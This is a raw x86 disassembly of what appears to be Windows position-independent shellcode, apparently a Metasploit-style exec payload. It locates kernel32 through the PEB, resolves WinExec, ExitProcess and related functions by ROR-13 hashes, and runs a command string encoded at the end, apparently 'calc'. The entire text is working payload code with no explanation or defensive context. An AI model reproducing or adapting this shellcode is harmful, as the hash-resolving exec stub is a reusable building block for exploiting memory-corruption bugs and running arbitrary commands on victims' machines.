cld
call   0x88
pusha
mov    ebp,esp
xor    eax,eax
mov    edx,DWORD PTR fs:[eax+0x30]
mov    edx,DWORD PTR [edx+0xc]
mov    edx,DWORD PTR [edx+0x14]
mov    esi,DWORD PTR [edx+0x28]
movzx  ecx,WORD PTR [edx+0x26]
xor    edi,edi
lods   al,BYTE PTR ds:[esi]
cmp    al,0x61
jl     0x25
sub    al,0x20
ror    edi,0xd
add    edi,eax
loop   0x1e
push   edx
push   edi
mov    edx,DWORD PTR [edx+0x10]
mov    ecx,DWORD PTR [edx+0x3c]
mov    ecx,DWORD PTR [ecx+edx*1+0x78]
jecxz  0x82
add    ecx,edx
push   ecx
mov    ebx,DWORD PTR [ecx+0x20]
add    ebx,edx
mov    ecx,DWORD PTR [ecx+0x18]
jecxz  0x81
dec    ecx
mov    esi,DWORD PTR [ebx+ecx*4]
add    esi,edx
xor    edi,edi
lods   al,BYTE PTR ds:[esi]
ror    edi,0xd
add    edi,eax
cmp    al,ah
jne    0x4f
add    edi,DWORD PTR [ebp-0x8]
cmp    edi,DWORD PTR [ebp+0x24]
jne    0x45
pop    eax
mov    ebx,DWORD PTR [eax+0x24]
add    ebx,edx
mov    cx,WORD PTR [ebx+ecx*2]
mov    ebx,DWORD PTR [eax+0x1c]
add    ebx,edx
mov    eax,DWORD PTR [ebx+ecx*4]
add    eax,edx
mov    DWORD PTR [esp+0x24],eax
pop    ebx
pop    ebx
popa
pop    ecx
pop    edx
push   ecx
jmp    eax
pop    edi
pop    edi
pop    edx
mov    edx,DWORD PTR [edx]
jmp    0x15
pop    ebp
push   0x1
jmp    0xb3
push   0x876f8b31
call   ebp              
mov    ebx,0x56a2b5f0
push   0x9dbd95a6
call   ebp              
cmp    al,0x6
jl     0xae
cmp    bl,0xe0
jne    0xae
mov    ebx,0x6f721347
push   0x0
push   ebx
call   ebp
call   0x8d
arpl   WORD PTR [ecx+0x6c],sp
arpl   WORD PTR [eax],ax